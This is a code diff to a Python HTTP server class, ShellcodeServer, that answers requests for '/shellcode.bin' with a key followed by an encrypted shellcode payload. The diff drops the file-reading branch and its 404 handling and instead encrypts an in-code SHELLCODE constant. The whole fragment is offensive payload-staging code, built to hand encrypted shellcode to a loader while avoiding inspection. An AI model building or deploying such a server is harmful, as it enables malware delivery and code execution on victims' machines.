@@ -20,26 +20,18 @@ def encrypt_payload(payload, key):
 class ShellcodeServer(SimpleHTTPRequestHandler):
     def do_GET(self):
         if self.path == "/shellcode.bin":
-            try:
-                with open("shellcode.bin", "rb") as f:
-                    shellcode = f.read()
+            key = generate_key()
 
-                key = generate_key()
+            encrypted_payload = encrypt_payload(SHELLCODE, key)
+            payload_tosend = key + encrypted_payload
+            # payload_tosend = SHELLCODE
 
-                encrypted_payload = encrypt_payload(SHELLCODE, key)
-                payload_tosend = key + encrypted_payload
-                # payload_tosend = SHELLCODE
+            self.send_response(200)
+            self.send_header("Content-type", "application/octet-stream")
+            self.send_header("Content-length", str(len(payload_tosend)))
+            self.end_headers()
+            self.wfile.write(payload_tosend)
 
-                self.send_response(200)
-                self.send_header("Content-type", "application/octet-stream")
-                self.send_header("Content-length", str(len(payload_tosend)))
-                self.end_headers()
-                self.wfile.write(payload_tosend)
-
-            except FileNotFoundError:
-                self.send_response(404)
-                self.end_headers()
-                self.wfile.write(b"Shellcode file not found.")
         else:
             self.send_response(404)
             self.end_headers()
